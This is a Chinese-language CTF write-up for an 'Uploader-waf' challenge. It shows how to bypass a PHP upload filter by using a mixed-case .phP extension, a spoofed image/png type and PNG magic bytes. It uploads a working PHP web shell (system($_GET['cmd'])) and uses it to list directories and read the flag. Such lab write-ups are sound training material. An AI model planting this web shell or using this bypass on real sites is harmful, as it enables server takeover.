#Web 

## 題目

**Uploader-waf**
給了一個網址，點開來是一個簡單的上傳頁面：
![[W1-7_web.png|386]]
網頁原始碼跟 [[Uploader]] 的一樣，但多了限制：
```php
if ($_FILES['file']['type'] === "image/png"){
	if ($extension !== "php" ){
		move_uploaded_file($_FILES['file']['tmp_name'], $dest);
		echo "<a href='/upload/$file_name'>/upload/$file_name</a>";
		echo "<p>Sucessful Uploaded !</p>";
	} 
	else{
		echo "<p>bad hecker detect! </p>";
	}
}
```

## 解題
1. 檢查網頁原始碼，發現限制上傳的類型必須是圖像檔
2. 打開 Burp Suite 觀察檔案上傳下載資訊
	1. Burp Suite 選 proxy 頁面 -> open a broswer -> 輸入題目的網址並隨意上傳一個檔案
	2. 在 request 的地方按右鍵 -> send to repeater
3. 修改送出的內容
   - 把 `filename` 改成另一個名字 `WebShell.phP`，繞過阻擋副檔名為 .php 的上傳請求
   - `Content-Type:` image/png
   - 系統會判斷檔案格式 -> 惡意程式前加上 png 檔案開頭的 file signature `89504E470D0A1A0A`
     > [!abstract]  file signature
     > 不受副檔名更改的影響，從二進位內容看出檔案本質
     > 常見的有：
     > - JPEG：`FF D8 FF`
     > - PNG：`89 50 4E 47 0D 0A 1A 0A`
     > - PDF：`%PDF`
     > - GIF：`GIF87a`
     > - ZIP：`50 4B 03 04`
   
   - 寫入惡意 php 程式 `system($_GET['cmd']);` 並送出
     ```php
     Content-Disposition: form-data; name="file"; filename="WebShell.phP"
		Content-Type: image/png
		
		89504E470D0A1A0A <?php system($_GET['cmd']); ?>
     ```
1. `response` 區域 render 出網頁樣貌，找到上傳的 `WebShell.php` 位置 `'/upload/WebShell.phP'`，並輸入到瀏覽器網址列
   ![[W1-8_cmd.png|630]]
2. 在網址最後加上 `?cmd=id`
   ![[W1-8_cmd2.png|576]]
   可以看到已經成功獲取 shell
3. 查找 flag
	1. `cmd=pwd` -> `/var/www/html/upload`
	2. `cmd=ls ..` -> `index.php upload`
	   `cmd=ls ../..` -> `html`
	   -> 去跟目錄查看 `cmd=ls ../../../..`
	   ![[W1-8_root.png|581]]-> 發現有個 flag 相關的檔案
	3. 查看檔案
	   - `cmd=cat ../../../../flag_NCA4jqt`：
	     ![[W1-8_flag.png|388]]
4. flag = `CTF{uploader_waf_aaf5cc31da14ec8b1766df23}`